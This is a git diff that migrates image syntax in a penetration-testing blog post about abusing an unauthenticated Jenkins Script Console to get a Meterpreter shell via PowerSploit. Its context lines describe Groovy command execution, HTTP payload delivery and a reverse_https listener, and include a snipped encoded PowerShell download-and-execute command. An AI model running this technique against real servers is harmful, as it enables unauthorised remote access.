@@ -7,10 +7,9 @@ categories:
 comments: true
 date: 2015-05-27T20:40:40Z
 title: jenkins to meterpreter - toying with powersploit
-url: /2015/05/27/jenkins-to-meterpreter-toying-with-powersploit/
 ---
 
-{% img right https://i.imgur.com/DNRQ8Nv.png %}
+{{< figure src="/images/jenkins_logo.png" >}}
 
 Recently I came across a few [Jenkins](https://jenkins-ci.org/) continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be *'secure'*. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.
 <!--more-->
@@ -18,7 +17,7 @@ Recently I came across a few [Jenkins](https://jenkins-ci.org/) continuous integ
 ## groooooooovy
 At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the *Script Console* that Jenkins provides:
 
-{% img https://i.imgur.com/5X43NOP.png %}
+{{< figure src="/images/jenkins_script_console.png" >}}
 
 This looked promising. *'Type in an arbitrary Groovy script and execute it on the server.'* I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the [documentation](http://www.groovy-lang.org/groovy-dev-kit.html#process-management).
 
@@ -29,7 +28,7 @@ println "Found text ${process.text}"
 
 The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!
 
-{% img https://i.imgur.com/UY83gvp.png %}
+{{< figure src="/images/jenkins_console_command_exec.png" >}}
 
 Nice and easy command execution! :D
 
@@ -81,7 +80,7 @@ cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcA
 ## pwn
 So, I now had the `payload` file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!
 
-{% img https://i.imgur.com/xBh1Uz9.png %}
+{{< figure src="/images/jenkins_powershell_payload.png" >}}
 
 From the python web server we can see the request come in for the payload:
 
